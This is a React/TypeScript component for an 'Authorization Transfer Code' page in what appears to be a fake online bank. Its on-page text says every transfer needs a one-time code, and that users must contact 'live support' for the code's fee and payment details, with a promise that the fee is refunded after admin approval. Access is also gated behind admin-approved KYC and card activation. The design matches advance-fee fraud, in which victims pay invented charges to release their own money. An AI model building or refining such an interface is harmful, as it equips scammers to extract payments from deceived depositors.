// User-facing ATC (Authorization Transfer Code) requests
import { useEffect, useState } from "react";
import { supabase } from "@/integrations/supabase/client";
import { useAuth } from "@/hooks/useAuth";
import { Card } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { toast } from "sonner";
import { fmtAccount, fmtDate, fmtMoney } from "@/lib/format";
import { sendEmail } from "@/lib/email";
import { KeyRound } from "lucide-react";

type Account = { id: string; account_number: string; account_type: string; balance: number };
type AtcReq = { id: string; account_id: string; amount: number; status: string; code: string | null; used: boolean; admin_note: string | null; created_at: string };

export default function ATC() {
  const { user, profile } = useAuth();
  const [accounts, setAccounts] = useState<Account[]>([]);
  const [requests, setRequests] = useState<AtcReq[]>([]);
  const [hasCard, setHasCard] = useState<boolean | null>(null);
  const [account, setAccount] = useState("");
  const [amount, setAmount] = useState("");
  const [busy, setBusy] = useState(false);

  const load = async () => {
    const [{ data: a }, { data: r }, { data: c }] = await Promise.all([
      supabase.from("accounts").select("*"),
      supabase.from("atc_requests").select("*").order("created_at", { ascending: false }),
      supabase.from("cards").select("id").limit(1),
    ]);
    setAccounts((a as Account[]) ?? []);
    setRequests((r as AtcReq[]) ?? []);
    setHasCard((c?.length ?? 0) > 0);
    if (a && a[0] && !account) setAccount(a[0].id);
  };
  useEffect(() => {
    if (!user) return;
    load();
    const ch = supabase.channel(`atc-${user.id}`)
      .on("postgres_changes", { event: "*", schema: "public", table: "atc_requests", filter: `user_id=eq.${user.id}` }, load)
      .on("postgres_changes", { event: "*", schema: "public", table: "cards", filter: `user_id=eq.${user.id}` }, load)
      .subscribe();
    return () => { supabase.removeChannel(ch); };
    // eslint-disable-next-line
  }, [user]);

  const isApproved = profile?.kyc_status === "approved";
  const ready = isApproved && hasCard;

  const submit = async () => {
    if (!user || !account) return;
    const amt = parseFloat(amount);
    if (!(amt > 0)) return toast.error("Enter a positive amount");
    setBusy(true);
    const { error } = await supabase.from("atc_requests").insert({
      user_id: user.id, account_id: account, amount: amt, status: "pending",
    });
    setBusy(false);
    if (error) return toast.error(error.message);
    sendEmail("atc-requested", profile!.email, `atc-${Date.now()}`, { name: profile!.full_name, amount: amt });
    toast.success("ATC request submitted. Contact support to confirm fee payment.");
    setAmount("");
  };

  return (
    <div className="container mx-auto p-4 md:p-8 max-w-2xl space-y-6">
      <div className="flex items-center gap-2">
        <KeyRound className="w-6 h-6 text-primary" />
        <h1 className="text-2xl font-bold">Authorization Transfer Code</h1>
      </div>

      {!ready && (
        <Card className="p-4 border-warning bg-warning/5">
          <div className="font-medium">
            {!isApproved ? "Verify your identity first" : "Activate your debit card first"}
          </div>
          <p className="text-sm text-muted-foreground mt-1">
            {!isApproved
              ? "ATC unlocks once admin approves your KYC."
              : "ATC unlocks once admin approves your debit card."}
          </p>
          <Button size="sm" className="mt-3" onClick={() => window.dispatchEvent(new CustomEvent("open-support-chat"))}>
            Contact live support
          </Button>
        </Card>
      )}

      <fieldset disabled={!ready} className="space-y-4 disabled:opacity-50">
        <Card className="p-4 space-y-3">
          <p className="text-sm text-muted-foreground">
            An Authorization Transfer Code (ATC) is required to authorize each transfer. Each code is unique, bound to one of your accounts, and can be used only once. Contact our live support agent for the ATC fee and payment details. Once admin approves, the fee is refunded to your account and the code is emailed to you.
          </p>
          <div>
            <Label>Account to bind the code to</Label>
            <Select value={account} onValueChange={setAccount}>
              <SelectTrigger><SelectValue /></SelectTrigger>
              <SelectContent>
                {accounts.map((a) => (
                  <SelectItem key={a.id} value={a.id}>{a.account_type} {fmtAccount(a.account_number)} — {fmtMoney(a.balance)}</SelectItem>
                ))}
              </SelectContent>
            </Select>
          </div>
          <div>
            <Label>Transfer amount this code will authorize</Label>
            <Input type="number" step="0.01" min="0.01" value={amount} onChange={(e) => setAmount(e.target.value)} />
          </div>
          <Button onClick={submit} disabled={busy} className="w-full">Request ATC code</Button>
        </Card>
      </fieldset>

      <div>
        <h2 className="font-semibold mb-3">Your ATC codes</h2>
        <Card className="divide-y">
          {requests.length === 0 ? (
            <div className="p-6 text-sm text-muted-foreground text-center">No ATC requests yet.</div>
          ) : requests.map((r) => {
            const acct = accounts.find((a) => a.id === r.account_id);
            return (
              <div key={r.id} className="p-4 space-y-1">
                <div className="flex items-center justify-between">
                  <div>
                    <div className="font-semibold tabular">{fmtMoney(r.amount)}</div>
                    <div className="text-xs text-muted-foreground">
                      {acct ? `${acct.account_type} ${fmtAccount(acct.account_number)} · ` : ""}{fmtDate(r.created_at)}
                    </div>
                  </div>
                  <Badge variant={r.status === "approved" ? "default" : r.status === "rejected" ? "destructive" : "secondary"} className="capitalize">
                    {r.used ? "used" : r.status}
                  </Badge>
                </div>
                {r.code && !r.used && (
                  <div className="font-mono text-base tracking-widest bg-secondary px-3 py-2 rounded text-center">{r.code}</div>
                )}
                {r.admin_note && <div className="text-xs text-muted-foreground">Note: {r.admin_note}</div>}
              </div>
            );
          })}
        </Card>
      </div>
    </div>
  );
}
